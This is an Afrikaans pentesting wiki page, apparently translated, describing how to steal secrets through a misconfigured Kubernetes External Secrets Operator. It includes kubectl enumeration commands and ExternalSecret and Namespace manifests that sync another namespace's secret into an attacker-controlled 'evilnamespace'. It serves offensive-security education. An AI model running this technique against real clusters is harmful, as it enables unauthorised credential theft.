# Eksterne Geheim Operateur

**Die oorspronklike skrywer van hierdie bladsy is** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Hierdie bladsy gee 'n paar aanwysers oor hoe jy kan slaag om geheime te steel van 'n verkeerd geconfigureerde ESO of aansoek wat ESO gebruik om sy geheime te sinchroniseer.

## Vrywaring

Die tegniek wat hieronder getoon word, kan slegs werk as sekere omstandighede voldoen is. Byvoorbeeld, dit hang af van die vereistes wat nodig is om 'n geheim te sinchroniseer op 'n naamspasie wat jy besit / gekompromitteer het. Jy moet dit self uitsorteer.

## Vereistes

1. 'n Voet in 'n kubernetes / openshift groep met administratiewe voorregte op 'n naamspasie
2. Lees toegang tot ten minste ExternalSecret op groepvlak
3. Vind uit of daar enige vereiste etikette / annotasies of groepslidmaatskap is wat nodig is om ESO toe te laat om jou geheim te sinchroniseer. As jy gelukkig is, kan jy vrylik enige gedefinieerde geheim steel.

### Inligting insamel oor bestaande ClusterSecretStore

Neem aan dat jy 'n gebruiker het wat genoeg regte het om hierdie hulpbron te lees; begin deur eers 'n lys van bestaande _**ClusterSecretStores**_ te maak.
```sh
kubectl get ClusterSecretStore
```
### Eksterne Geheim opsomming

Laat ons aanneem jy het 'n ClusterSecretStore genaamd _**mystore**_ gevind. Gaan voort deur sy geassosieerde eksterne geheim op te som.
```sh
kubectl get externalsecret -A | grep mystore
```
_Die hulpbron is namespace omvang, so tensy jy reeds weet in watter namespace om te soek, voeg die -A opsie by om regoor alle namespaces te soek._

Jy moet 'n lys van gedefinieerde externalsecret kry. Laat ons aanneem jy het 'n externalsecret objek genaamd _**mysecret**_ gevind wat gedefinieer en gebruik word deur namespace _**mynamespace**_. Versamel 'n bietjie meer inligting oor watter soort geheim dit bevat.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Die stukke saamstel

Van hier af kan jy die naam van een of meer geheime name kry (soos gedefinieer in die Secret-hulpbron). Jy sal 'n uitset kry soortgelyk aan:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
```html
<p>So far we got:</p>

<ul>
<li>Name a ClusterSecretStore</li>
<li>Name of an ExternalSecret</li>
<li>Name of the secret</li>
</ul>

<p>Now that we have everything we need, you can create an ExternalSecret (and eventually patch/create a new Namespace to comply with prerequisites needed to get your new secret synced):</p>
```
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Na 'n paar minute, as die sinchroniseringstoestande voldoen is, behoort jy in staat te wees om die uitgelekte geheim binne jou namespace te sien.
```sh
kubectl get secret leaked_secret -o yaml
```
## Verwysings

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
